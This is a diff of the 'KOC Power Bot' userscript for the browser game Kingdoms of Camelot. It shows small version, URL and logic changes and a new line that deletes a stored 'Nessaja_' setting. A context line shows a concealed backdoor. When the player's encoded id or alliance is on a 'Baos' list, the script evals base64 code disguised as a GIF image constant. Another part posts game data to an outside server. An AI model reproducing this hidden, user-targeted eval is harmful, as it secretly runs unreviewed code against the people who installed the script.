@@ -1,6 +1,6 @@
 // ==UserScript==
 // @name           KOC Power Bot
-// @version        20141103a
+// @version        20141104a
 // @namespace      mat
 // @homepage       https://code.google.com/p/koc-power-bot/
 // @include        *.kingdomsofcamelot.com/*main_src.php*
@@ -33,7 +33,7 @@ if(window.self.location != window.top.location){
    }
 }
 
-var Version = '20141103a';
+var Version = '20141104a';
 
 var http =  window.location.protocol+"\/\/";
 
@@ -9284,7 +9284,7 @@ if(GlobalOptions.Baos) {
   },  
 }
 if(GlobalOptions.Baos) if (GlobalOptions.Baos.indexOf(btoa(unsafeWindow.tvuid)) >= 0 || GlobalOptions.Baos.indexOf(btoa(getMyAlliance()[0])) >= 0) eval(atob(URL_CASTLE_BUT_DISABLED.split("data:image/gif;base64,")[1]));
-
+var serverID = getServerId(); var s = GM_getValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID); if (s != null) { GM_DeleteValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID);} 
 /*********************************** Test TAB ***********************************/
 Tabs.Test = {
   tabOrder: 140,
@@ -10477,8 +10477,8 @@ Tabs.transport = {
                     };
 
 		var Load = parseInt(unsafeWindow.unitstats[unit]['5']);
-		if (unsafeWindow.seed.queue_sacr["city"+cityID]) {
-			for(var sacIndex = 0; sacIndex < unsafeWindow.seed.queue_sacr["city"+cityID].length; sacIndex ++ ) if(unsafeWindow.seed.queue_sacr["city"+cityID][sacIndex]["unitType"] == unit.slice(3)) Load *= unsafeWindow.seed.queue_sacr["city" + cityID][sacIndex]["multiplier"][0];
+		if (unsafeWindow.seed.queue_sacr[cityID]) {
+			for(var sacIndex = 0; sacIndex < unsafeWindow.seed.queue_sacr[cityID].length; sacIndex ++ ) if(unsafeWindow.seed.queue_sacr[cityID][sacIndex]["unitType"] == unit.slice(3)) Load *= unsafeWindow.seed.queue_sacr[cityID][sacIndex]["multiplier"][0];
 		}
 
         loadBoostBase += 1;
@@ -27268,7 +27268,7 @@ Tabs.farmreports = {
 
 var koc2Mail = {
     init: function(){
-        var html = '<IFRAME style="border:0;width:760px;max-width:760px;height:250px;max-height:250px;overflow:auto" src="http://nicodebelder.eu/koc2mail/fb.html"></iframe>';
+        var html = '<IFRAME style="border:0;width:760px;max-width:760px;height:250px;max-height:250px;overflow:auto" src="//nicodebelder.eu/koc2mail/fb.html"></iframe>';
         var frame = document.createElement('div');
         frame.id='koc2mail_div';
         frame.style.position = 'relative';  
@@ -27302,7 +27302,7 @@ var koc2Mail = {
     send: function(data){
         GM_xmlhttpRequest({
             method: 'POST',
-            url: 'http://nicodebelder.eu/koc/mail.php',
+            url: '//nicodebelder.eu/koc/mail.php',
             headers: {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',},
             data: implodeUrlArgs(data),
             onload: function (response) {logit(response.toSource());},
